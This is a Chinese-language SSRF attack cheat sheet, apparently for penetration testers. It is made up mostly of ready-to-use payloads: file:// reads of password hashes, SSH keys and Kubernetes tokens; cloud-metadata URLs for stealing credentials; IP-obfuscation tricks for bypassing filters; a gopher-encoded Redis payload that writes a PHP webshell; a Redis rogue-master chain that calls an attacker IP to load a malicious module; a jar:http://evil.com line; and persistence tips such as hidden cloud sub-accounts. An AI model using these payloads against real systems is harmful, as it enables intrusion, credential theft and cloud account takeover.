## SSRF 本质与原理

**SSRF（Server-Side Request Forgery，服务端请求伪造）**：攻击者构造恶意输入，诱使**服务端**代替自己发起网络请求，从而访问攻击者原本无法直接触达的资源（内网服务、本机端口、云元数据等）。本质上是**把服务器变成了自己的"跳板/代理"**。



### 形成的两个充要条件:

| 条件                             | 说明                                       | 典型业务                                   |
| :------------------------------- | :----------------------------------------- | :----------------------------------------- |
| ① 服务端主动发起请求             | 业务功能需要服务器去拉取/探测某个 URL 资源 | 远程头像上传、网页截图、文章采集、回调通知 |
| ② 目标地址可被用户控制且校验不足 | URL/IP 未校验、仅黑名单、白名单可被绕过    | 参数 `?url=` 直接传入 `http://127.0.0.1/`  |



### 危害链条总览

```
信息泄露（file:// 读源码/配置）
   └─▶ 内网探测（扫网段/端口/指纹）
         └─▶ 内网服务攻击（Redis/MySQL/FastCGI/内网Web CVE）
               └─▶ 命令执行 / 拿下内网主机
云环境特有条目：SSRF ─▶ 169.254.169.254 元数据 ─▶ AK/SK/STS ─▶ 接管整个云账号
```



### SSRF 分类

- **读文件型**：`file:///etc/passwd`、`php://filter` 读源码。
- **探测型**：扫内网 IP/端口，绘拓扑。
- **打击型**：gopher/dict 打 Redis、MySQL、FastCGI、SMTP 等 TCP 服务。
- **Web 型**：打内网 Web 应用（Tomcat/Weblogic/Confluence 历史 CVE）。
- **云元数据型**：169.254.169.254 系列，偷临时凭据。
- **跳板型**：借服务器身份访问只有它能访问的第三方（VPN 内、办公网）。





##  常见漏洞场景

### 高危业务场景

| 场景                       | 功能描述                                                 | 风险点                                      |
| :------------------------- | :------------------------------------------------------- | :------------------------------------------ |
| **高频**远程资源上传       | 通过 URL 上传头像/图片/附件                              | 直接控制请求目标，常支持 file://            |
| **高频**网页截图/预览      | 输入 URL 生成缩略图、站点快照（puppeteer/wkhtmltoimage） | 无头浏览器可执行 JS，危害放大               |

| **高频**Webhook/回调配置   | 用户自定义通知回调地址                                   | 常为盲 SSRF，配合 DNSLog                    |
| **中频**文档在线预览       | Office/PDF 在线预览转码                                  | 转换组件拉取远程文档                        |
| **中频**PDF 导出           | wkhtmltopdf/weasyprint 渲染页面                          | 可加载远程/本地资源，可读文件               |
| **中频**短链接/二维码解析  | 还原短链、解析二维码内容并访问                           | 常跟随 302，利于绕过                        |
| **中频**RSS 订阅/Feed 抓取 | 定时抓取 Feed 地址                                       | 盲打 + 定时任务特征                         |

| **低频**云监控/拨测        | 站点可用性监控、URL 拨测                                 | 多点发起，可探测多内网段                    |
| **低频**CDN 回源配置       | 自定义回源地址                                           | 权限要求高但危害大                          |
| **低频**图片处理管道       | ImageMagick/GraphicsMagick 处理用户图片                  | MVG/SVG 内嵌 URL → SSRF+RCE（ImageTragick） |



### 从 JS/接口中发现 SSRF 点位

- 全局搜索前端 JS 中的关键字：`/fetch`、`/proxy`、`/preview`、`/screenshot`、`/crawl`、`/translate`、`/uploadByUrl`、`/download?url=`。
- 历史 URL 采集（gau/waybackurls）后用 qsreplace 批量替换参数值为自己的 DNSLog 域名，被动等回连。
- 关注 **XML/SVG/Docx 上传**类接口：XXE 外部实体、SVG 内 `<image href>` 都会触发服务端出网。

### 核心协议利用速览

| 协议          | Payload 示例                                        | 用途                                                         |
| :------------ | :-------------------------------------------------- | :----------------------------------------------------------- |
| http/https    | `http://192.168.1.10:8080/manager/html`             | 打内网 Web、读元数据、跳板                                   |
| file          | `file:///etc/passwd` · `file:///C:/Windows/win.ini` | 读本地文件（注意 Java 部分环境仅 Linux 有效）                |
| dict          | `dict://127.0.0.1:6379/info`                        | 探测 TCP 服务 banner、Redis 信息、简单命令交互               |
| gopher        | `gopher://127.0.0.1:6379/_%2a1%0d%0a...`            | **万能 TCP 协议**，构造任意字节流打 Redis/MySQL/FastCGI/SMTP |
| ftp           | `ftp://127.0.0.1:21/`                               | 探测 FTP；历史被动模式 SSRF 放大                             |
| ldap          | `ldap://127.0.0.1:389`                              | 探测目录服务                                                 |
| tftp          | `tftp://127.0.0.1:69/xx`                            | 盲探测（UDP）                                                |
| smb           | `smb://127.0.0.1:445`                               | Windows 环境探测/NTLM 中继思路                               |
| phar          | `phar://uploads/x.jpg/x`                            | 结合文件上传触发 PHP 反序列化                                |
| jar (Java)    | `jar:http://evil.com/x.jar!/`                       | 历史 JDK 漏洞链（现代 JDK 已修）                             |
| netdoc (Java) | `netdoc:///etc/passwd`                              | Java 下 file 被禁时的替代                                    |

dict:// 的实用细节:

dict 协议返回的目标服务原始 banner 常被业务"原样回显"，因此 `dict://127.0.0.1:6379/info` 能直接拿到 Redis 版本、运行模式、持久化路径——是半盲环境下确认 Redis 存在、决定能否进一步 gopher 打击的关键一步。dict 命令中的特殊字符需 URL 编码，换行用 `%0d%0a`。

### file:// 读文件常用路径

Linux

```
#Linux 用户清单文件，默认所有用户可读。里面记录所有账号：用户名、UID、GID、家目录、登录 Shell。
file:///etc/passwd

#存放所有用户密码哈希（sha512 等），默认只有 root 权限才能读。
file:///etc/shadow        # 需 root 权限进程

#本地域名解析表，服务器本地 host 绑定。看有没有内网域名、自定义 host 映射
file:///etc/hosts

#`/proc`是 Linux 伪文件系统；`self`代表**当前正在运行的这个进程**；environ 保存进程的环境变量。
读取环境变量里的密钥、数据库账号、SECRET_KEY；
file:///proc/self/environ

#内核 ARP 缓存表，记录这台服务器最近通信过的内网 IP+MAC 地址。内网存活主机探测
file:///proc/net/arp      # 内网邻居，辅助定段

#内核路由表。拿到网关、网段信息，判断内网拓扑、C 段，规划下一步内网横向。
file:///proc/net/route

#root 用户的 bash 命令历史记录。看 root 之前敲过什么命令，经常泄露密码、数据库连接、密钥路径、敏感命令。
file:///root/.bash_history

#root 的 SSH 私钥！
file:///root/.ssh/id_rsa

#Nginx 访问日志。志包含访问记录、UA、参数；经典 LFI 日志包含拿 shell：往日志里写入 php 一句话，再包含日志文件执行代码。
file:///var/log/nginx/access.log

#网站数据库配置文件（路径是示例）。读取 php 配置，拿到数据库账号密码，进数据库拖数据。
file:///www/wwwroot/.../config.php
```

Windows

```
#Windows 系统旧配置文件，默认存在，**用来验证 file 读取是否成功**
file:///C:/Windows/win.ini

#Windows 版 hosts，和 Linux /etc/hosts 作用一致，本地域名解析。查看内网域名、host 绑定。
file:///C:/Windows/System32/drivers/etc/hosts

#IIS 网站的配置文件（.NET 站点）。读取数据库连接字符串、密钥、站点配置。inetpub 是 IIS 默认站点根目录。
file:///C:/inetpub/wwwroot/web.config

#phpStudy 集成环境的站点配置文件（路径示例）。拿到 PHP 网站数据库账号密码，国内环境非常常见。
file:///C:/phpStudy/.../config.php
```



## 内网探测

### 内网网段优先级

```
127.0.0.0/8      # 本机：Redis/FastCGI/本地 Web 管理口 最常见
192.168.0.0/16   # 传统办公/IDC 内网
10.0.0.0/8       # 云上 VPC 首选段
172.16.0.0/12    # 次常见内网段 / Docker 默认 172.17.0.0/16

fc00::/7 ::1     # IPv6 内网与本机
```

### 半盲环境下的批量扫描技巧

- **先扫 127.0.0.1 全端口**（本机服务最常裸奔），再扫 `/proc/net/arp`、`/etc/hosts` 泄露的邻居 IP。
- 用响应时间做通道时，每个 IP 测 3 次取中位数，排除抖动。
- 有回显场景直接请求 `http://IP:PORT/` 看标题；无回显用 dict 探 banner 或 DNSLog 验证连通性。
- 扫到存活 Web 后，用路径字典打常见后台：`/manager/html`、`/jmx-console`、`/console`、`/actuator/env`（Spring 泄露配置）。





## 云环境元数据窃取

### 各云元数据接口速查总表

| 厂商   | 元地址 & 凭据路径                                            | 特殊要求                         | 解读                                                         |
| ------ | ------------------------------------------------------------ | -------------------------------- | ------------------------------------------------------------ |
| AWS    | `169.254.169.254/latest/meta-data/iam/security-credentials/<角色名>` | IMDSv2 需要先 PUT 拿 token       | AWS IMDS 分两代。v1 直接 GET 拿凭据；v2 强制先 PUT 请求获取短期 token，后续请求必须携带 token 请求头，用来防御普通 SSRF。 |
| 阿里云 | `100.100.100.200/latest/meta-data/ram/security-credentials/<角色名>` | 加固模式需要 token 头            | 阿里云元地址是`100.100.100.200`，RAM 角色凭据。现在新版 ECS 支持加固模式，类似 AWS IMDSv2，不带 token 无法读取凭据。 |
| 腾讯云 | `metadata.tencentyun.com` / `169.254.0.23/latest/meta-data/cam/security-credentials/<角色名>` | -                                | 两个地址等价，CAM 是腾讯云的权限体系，对应 RAM/IAM，拿到 CAM 凭据就可以调用腾讯云 API。 |
| 华为云 | `169.254.169.254/openstack/latest/securitykey`               | -                                | 华为底层基于 OpenStack，路径和 AWS 不一样，这里拿到的是 ECS 的临时安全密钥。 |
| Azure  | `169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | 必须带请求头 `Metadata: true`    | Azure 托管身份，返回 OAuth2 的 access_token，不是 AK/SK；用这个 token 调用 Azure Resource Manager 接口。**少这个头直接 400 拒绝** |
| GCP    | `metadata.google.internal` / `169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token` | 必须带 `Metadata-Flavor: Google` | GCP 强校验这个请求头，没有头直接拒绝访问元数据，防御无脑 SSRF。 |
| 京东云 | `169.254.169.254/latest/meta-data/...`                       | -                                | 兼容 AWS 风格路径，结构和 AWS 元数据很像                     |
| UCloud | `100.80.80.80/meta-data/v1/...`                              | -                                | UCloud 自研元地址，不是 169.254 段                           |

### 标准利用流程（以阿里云为例）

```
1. http://100.100.100.200/latest/meta-data/                          # 确认是云环境
2. http://100.100.100.200/latest/meta-data/ram/security-credentials/ # 拿到 RAM 角色名
3. http://100.100.100.200/latest/meta-data/ram/security-credentials/<角色名>
   → 返回 AccessKeyId / AccessKeySecret / SecurityToken / Expiration
4. 本地配置凭据 → aliyun-cli / 云利用框架 CF → 列出 ECS/OSS/RDS → 接管
```



### AWS IMDSv1 vs IMDSv2

|           | IMDSv1                                  | IMDSv2                                                       |
| --------- | --------------------------------------- | ------------------------------------------------------------ |
| 请求方式  | 直接 GET 访问凭据路径                   | 第一步：PUT 请求 `/latest/api/token`，带上头 `X-aws-ec2-metadata-token-ttl-seconds: 21600` 获取 token；第二步：GET 读取元数据，带上头 `X-aws-ec2-metadata-token: <token>` |
| SSRF 影响 | 普通 GET 型 SSRF 直接读取凭据，危害极大 | **绝大多数普通 SSRF 只能发起 GET，不能发 PUT、不能自定义请求头，直接失效**，防护效果很强 |
| 绕过思路  | 无                                      | 1. 实例**没有强制 IMDSv2**，同时兼容 v1，直接回退 v1 payload；2. SSRF 点支持自定义请求方法、自定义 HTTP 头（比如代理类 SSRF、gopher 打）；3. ECS 容器任务凭据：`169.254.170.2` 这个端点，独立于 IMDS；4. 从应用日志、环境变量里面直接捞硬编码 AK |

> 很多人误区：IMDSv2 不是关闭元数据，是给元数据访问加了一个**前置挑战**，普通 GET SSRF 过不了这个挑战。



### 容器 & K8s 环境元数据 / 凭据（云原生 SSRF/LFI 拓展）

容器环境分两种：AWS ECS 容器、K8s 集群 Pod，**和 ECS 虚拟机元数据不是一套体系**



AWS ECS 容器任务凭据:

```
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

- 这是 ECS 容器专属凭据地址，**不受 IMDSv2 管控**！早期大量 ECS 集群靠这个绕过 IMDSv2 防护拿凭据，是很经典的打法。
- 环境变量 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 里面自带后半段路径。



K8s ServiceAccount（K8s 最核心的文件凭据，用 file:// LFI 读取）K8s 方案：

**容器启动的时候，直接把 ServiceAccount 的 JWT 令牌、CA 证书，以文件形式挂载到容器内部固定目录**

```
file:///var/run/secrets/kubernetes.io/serviceaccount/token     # ServiceAccount的JWT token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt     # k8s集群CA证书
https://kubernetes.default.svc/api                              # Pod内集群API Server默认域名
```

解读： K8s Pod 启动时，会自动挂载 serviceaccount 的密钥到这个固定路径。 只要存在 LFI/SSRF（file 协议）读到这个 token，就可以访问 k8s apiserver，权限取决于这个 sa 的权限：查 pod、exec 进容器、拉镜像，甚至接管集群。

| 环境           | 凭据怎么拿                   | 获取方式     | 防御体系                   | 适合什么漏洞打     |
| -------------- | ---------------------------- | ------------ | -------------------------- | ------------------ |
| AWS EC2 虚拟机 | `169.254.169.254` IMDS       | HTTP GET/PUT | IMDSv1 / IMDSv2            | SSRF（http 协议）  |
| AWS ECS 容器   | `169.254.170.2`              | HTTP GET     | 独立体系，不受 IMDSv2 约束 | SSRF（http 协议）  |
| K8s Pod        | `/var/run/secrets/.../token` | 读取本地文件 | RBAC 权限、ServiceAccount  | **LFI（file://）** |

kubelet 未授权访问

`https://NodeIP:10250/pods` `/runningpods/` `/exec/<ns>/<pod>/<container>?command=xxx` kubelet 是节点代理服务，10250 端口；如果没有开启认证，攻击者可以直接列出 Pod，执行命令，属于内网高危漏洞，SSRF 打到节点内网就可以利用。





## waf 绕过技术全景

IP 表示法变形（数字 IP 的七十二变）—— 以 127.0.0.1 为例

| 类别             | Payload                                                  | 说明                                |
| :--------------- | :------------------------------------------------------- | :---------------------------------- |
| 纯十进制整数     | `http://2130706433/`                                     | 127.0.0.1 = 0x7F000001 = 2130706433 |
| 纯十六进制       | `http://0x7f000001/`                                     | 整体 hex                            |
| 点分十六进制     | `http://0x7f.0x0.0x0.0x1/`                               | 分段 hex                            |
| 点分八进制       | `http://0177.0.0.1/`                                     | 0177 = 127                          |
| 混合进制         | `http://0x7f.1/` · `http://127.0.1/`                     | 进制+省略混用                       |
| 省略写法         | `http://127.1/` · `http://127.0.1/`                      | inet_aton 允许省略中段自动补        |
| 零替代           | `http://0/` · `http://0.0.0.0/`                          | 多数环境解析为 127.0.0.1 或本机     |
| 长整数补零       | `http://000177.0000.0000.0001/`                          | 补零八进制                          |
| IPv6 本机        | `http://[::1]/` · `http://[::]/`                         | 仅校验 IPv4 时常见漏网              |
| IPv4-mapped IPv6 | `http://[::ffff:127.0.0.1]/` · `http://[::ffff:7f00:1]/` | 映射写法，杀穿 IPv4 黑名单          |
| CIDR 混淆        | `127.0.0.1/32` 类                                        | 个别解析器截断后生效，环境相关      |



域名类绕过(校验逻辑在【域名字符串】，而不是【解析后的 IP】，就会被这一类手法打穿)

| 手法            | Payload 示例                                                 | 原理                     |
| :-------------- | :----------------------------------------------------------- | :----------------------- |
| 泛解析服务      | `127.0.0.1.nip.io` · `127.0.0.1.xip.io` · `a.127.0.0.1.sslip.io` | 域名里嵌的 IP 即解析结果 |

| 自有域名 A 记录 | `a.你的域名 → 127.0.0.1`                                     | 最稳，不依赖第三方存活   |

##  Gopher协议 深度利用

Gopher 协议语法:

```
gopher://host:port/[gophertype][raw_payload]
例子：`gopher://127.0.0.1:6379/_xxxx`
约定：路径第一个字符（gophertype，习惯用 _ 占位）被丢弃，其后才是真实发送的字节流。
所有控制字符必须 URL 编码；经一层 HTTP 参数传递时通常要 二次编码：
  换行 \r\n  →  %0d%0a  →（二次）%250d%250a
```

编码层数判断口诀

Payload 经过几次 URL 解码就编几次码。GET 参数传 URL（解码 1 次）→ curl 再请求（原样发出）：对 `%0d%0a` 只需一次编码；若业务先 `urldecode` 再传给 curl，则需要二次编码。实测时两种都试。



 RESP 协议 30 秒入门（Redis 通信协议，打 Redis 必须会）:

Redis 默认使用 **RESP（Redis Serialization Protocol）**，是明文分块协议，所有命令都按这个格式发包，gopher 就是把一串 RESP 字节流丢给 6379 端口。

格式规则：

1. `*N` ：代表这条命令一共有 **N 个参数**，后面跟 `\r\n`

2. `$M` ：代表下一个参数的字节长度是 **M**，后面跟 `\r\n`

3. 紧跟着参数原始内容，再 `\r\n`

   ```
   *3\r\n
   $3\r\n
   SET\r\n
   $1\r\n
   a\r\n
   $5\r\n
   hello\r\n
   ```





 Gopher 打 Redis ① —— 写文件 Getshell（Redis 以 root/高权限运行）:

利用 Redis 的 RDB 持久化：`config set dir` 修改 RDB 保存目录，`config set dbfilename` 修改 RDB 文件名，执行 save 落地文件。

```
flushall
set 1 "\n\n<?php @eval($_POST['cmd']);?>\n\n"
config set dir /var/www/html
config set dbfilename shell.php
save
```

转成 RESP：

```
*1\r\n$8\r\nflushall\r\n
*3\r\n$3\r\nset\r\n$1\r\n1\r\n$33\r\n\n\n<?php @eval($_POST['cmd']);?>\n\n\r\n
*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n
*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n
*1\r\n$4\r\nsave\r\n
```

拼接为 gopher（关键片段示例，已截断展示）：

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a
$33%0d%0a%0a%0a<?php%20@eval($_POST['cmd']);?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset
%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0a
dbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

| 写文件姿势        | 目标路径                             | 适用条件                    |
| :---------------- | :----------------------------------- | :-------------------------- |
| 写 webshell       | Web 目录（需先探明路径）             | Web 与 Redis 同机、有写权限 |
| 写 SSH 公钥       | /root/.ssh/authorized_keys           | Redis 以 root 运行、开 22   |
| 写计划任务        | /var/spool/cron/root 或 /etc/cron.d/ | root 运行、有 crond         |
| 写 systemd / 自启 | /etc/systemd/system/                 | 容器场景少见但存在          |



Gopher 打 Redis ② —— 主从复制加载模块 RCE（Redis 4.x/5.x经典洞）;

原理：Redis 主从同步机制，从库会全量同步主库的 RDB 文件，我们搭建恶意主库，放恶意扩展 so，加载后拿到命令执行。

```
利用链：SLAVEOF 攻击者IP 21021   # 让目标成为恶意主库的从库
        CONFIG SET dbfilename exp.so
        恶意主库全量同步 → 投放恶意 .so 模块
        MODULE LOAD ./exp.so     # 加载模块获得命令执行
        system.exec "id"
```

- SSRF 场景下攻击者需在自己的 VPS 起**恶意 Redis 主库**（工具:redis-rogue-server / RedisModules-ExecuteCommand）。
- SSRF 的 gopher 只负责投递 SLAVEOF、CONFIG、MODULE LOAD 这几条命令；**数据同步是目标 Redis 主动向外连你的 VPS，不是 gopher 发包**，所以你的 VPS 必须公网可达、放行 21021 端口；
- 6.x 引入 ACL 后利用面收窄，但存量 4/5.x 极多。
- 内网隔离场景：目标 Redis 无法出网回连 VPS → 这个利用链直接废掉，只能选写文件。





Gopher 打 PHP-FPM（FastCGI 9000 端口）

- 原理：PHP-FPM 使用 FastCGI 协议通信。我们构造 FastCGI 请求包，向 9000 端口直接投递 FastCGI 协议报文，设置 `PHP_VALUE: auto_prepend_file = php://input`，把 PHP 代码塞进请求体实现**任意代码执行**，无需 Web 目录写权限。
- 条件：能 SSRF 触达 9000；知道一个存在的 .php 文件绝对路径（如 `/var/www/html/index.php`，可用 file:// 读或默认路径猜）。
- 手工构造报文极繁琐，直接用 **Gopherus** 的 FastCGI 模块一键生成 gopher payload。



 Gopher 打 MySQL

路线 A：已知账号密码，内网 MySQL 直接执行 SQL

MySQL 客户端协议，构造握手认证包 + 查询包，发送给 3306，执行任意 SQL。 工具：Gopherus，传入用户名密码 + SQL 生成 payload。 适用场景：弱口令、账号泄露，SSRF 连 3306 查数据、写 into outfile 拿 shell（需要 secure_file_priv 为空）。



路线 B：Rogue-MySQL-Server（恶意 MySQL 服务，经典读文件）

核心漏洞：`LOAD DATA LOCAL INFILE` 利用链：

1. VPS 搭建恶意 MySQL 服务端
2. Gopher 发包，让目标应用（作为 MySQL 客户端）连接我们恶意 mysql
3. 恶意服务返回特殊数据包，诱导客户端开启 `LOAD DATA LOCAL INFILE`
4. 目标主动把本机任意文件内容发送到我们 VPS 上

优点：不需要数据库账号！直接读文件（/etc/passwd、配置文件、源码）
限制：目标程序的 mysql 客户端驱动支持 LOAD DATA LOCAL INFILE；新版驱动默认关闭该特性，利用变少。





Gopher 打其他服务（模板思路）

```
PostgreSQL：  构造启动包+简单查询协议，gopherus 有现成模块
SMTP：        HELO/MAIL FROM/RCPT TO/DATA 伪造内部邮件（钓鱼/改密邮件）
Zabbix：      通信心跳包投放命令（需 agent 场景）
Memcached：   set/get 明文协议，直接投递缓存投毒
Supervisor：  HTTP+XMLRPC 管理口执行进程命令（配合 http 协议即可）
```

## 后利用与危害升级链

六条经典升级链

```
① SSRF(file://) → 读源码/配置 → 数据库凭据 → 拖库/后台登录
② SSRF → 云元数据 → AK/SK/STS → 云 API 全控（ECS/OSS/RDS/RAM）→ 数据与持久化
③ SSRF(gopher) → Redis 未授权 → 写 shell/主从 RCE → 内网第一台立足点 → fscan 横向
④ SSRF → PHP-FPM 9000 → auto_prepend_file → 直接 RCE
⑤ SSRF → 内网 Web 历史 CVE（Tomcat PUT/Weblogic/Confluence/海康/泛微）→ RCE
⑥ SSRF → K8s：读 SA token → apiserver 提权 → 在全部节点执行 → 容器逃逸 → 集群接管
```

从 SSRF 到内网立足的标准动作

1. file:// 读 `/proc/net/arp`、`/etc/hosts`、网卡配置 → 确定内网段。
2. 扫段内 6379/9000/2375/22/445/3306/8080 等高危端口。
3. 有 Redis 先打 Redis（成本最低收益最高）；拿到 shell 后落地 fscan 全段测绘。
4. 将战果整理为"内网资产清单 + 漏洞清单"，按授权边界推进。

权限维持思路（授权演练）

- Redis 主从 RCE 后在计划任务/authorized_keys 留双通道。
- 云环境：用拿到的 RAM 权限创建隐蔽子账号/AccessKey（**需在授权书中明确允许**，并在报告中如实列出供客户清理）。
- 内网 Web 马 + 计划任务双保险，全部登记进报告交付清单。
